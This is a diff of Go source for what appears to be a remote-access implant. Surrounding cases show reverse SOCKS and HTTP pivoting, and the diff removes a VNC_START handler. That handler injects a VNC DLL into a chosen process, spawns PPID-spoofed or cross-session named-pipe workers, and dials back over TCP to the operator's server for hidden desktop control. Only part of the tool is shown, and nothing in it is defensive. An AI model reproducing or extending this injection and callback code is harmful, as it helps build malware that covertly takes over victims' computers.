@@ -7,7 +7,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -1281,89 +1280,6 @@ func dispatchTask(t transport, task taskWire) {
 
 	case "RSOCKS_STOP":
 		t.sendResult(task.ID, stopRSocks(), "")
-
-	// ── Interactive VNC desktop ───────────────────────────────────────────────
-
-	case "VNC_START":
-		// Args: "<callbackPort> <quality> [<pid> [<session_id> [<mode>]]]"
-		// mode: "dll"    → inject VNC DLL into targetPID
-		//       "worker" → spawn worker subprocess via named pipe (cross-session if session_id>0)
-		//       (default) → same as before: direct PS capture or PPID-spoof spawn
-		parts := strings.Fields(strings.TrimSpace(task.Args))
-		if len(parts) == 0 {
-			t.sendResult(task.ID, "", "usage: VNC_START <callback_port> [quality] [pid] [session_id] [dll|worker]")
-			return
-		}
-		quality := 60
-		if len(parts) >= 2 {
-			if q, err := strconv.Atoi(parts[1]); err == nil && q >= 1 && q <= 100 {
-				quality = q
-			}
-		}
-		targetPID := 0
-		if len(parts) >= 3 {
-			if p, err := strconv.Atoi(parts[2]); err == nil && p > 0 {
-				targetPID = p
-			}
-		}
-		sessionID := 0
-		if len(parts) >= 4 {
-			if s, err := strconv.Atoi(parts[3]); err == nil && s > 0 {
-				sessionID = s
-			}
-		}
-		mode := ""
-		if len(parts) >= 5 {
-			mode = strings.ToLower(parts[4])
-		}
-
-		switch mode {
-		case "dll":
-			// DLL injection into targetPID.
-			host := serverHost(ServerURL)
-			if host == "" {
-				t.sendResult(task.ID, "", "vnc dll: cannot determine server host")
-				return
-			}
-			conn, dialErr := net.DialTimeout("tcp", net.JoinHostPort(host, parts[0]), 10*time.Second)
-			if dialErr != nil {
-				t.sendResult(task.ID, "", "vnc dll dial: "+dialErr.Error())
-				return
-			}
-			if err := vncStartDLL(conn, quality, targetPID); err != nil {
-				conn.Close()
-				t.sendResult(task.ID, "", err.Error())
-				return
-			}
-			t.sendResult(task.ID, fmt.Sprintf("[+] VNC DLL injected into PID %d (callback :%s)", targetPID, parts[0]), "")
-
-		case "worker":
-			// Named-pipe worker subprocess.
-			if err := vncStartWorker(parts[0], quality, targetPID, sessionID); err != nil {
-				t.sendResult(task.ID, "", err.Error())
-				return
-			}
-			t.sendResult(task.ID, fmt.Sprintf("[+] VNC worker spawned (pid=%d session=%d callback :%s)", targetPID, sessionID, parts[0]), "")
-
-		default:
-			if targetPID > 0 {
-				childPID, err := vncSpawnInject(parts[0], quality, targetPID)
-				if err != nil {
-					t.sendResult(task.ID, "", err.Error())
-					return
-				}
-				t.sendResult(task.ID, fmt.Sprintf("[+] VNC spawned (PID %d) PPID-spoofed to %d (callback :%s)", childPID, targetPID, parts[0]), "")
-			} else {
-				if err := vncStart(parts[0], quality); err != nil {
-					t.sendResult(task.ID, "", err.Error())
-					return
-				}
-				t.sendResult(task.ID, "[+] VNC session started (callback port "+parts[0]+")", "")
-			}
-		}
-
-	case "VNC_STOP":
-		t.sendResult(task.ID, vncStop(), "")
 
 	case "HTTP_PIVOT_START":
 		port := 8888
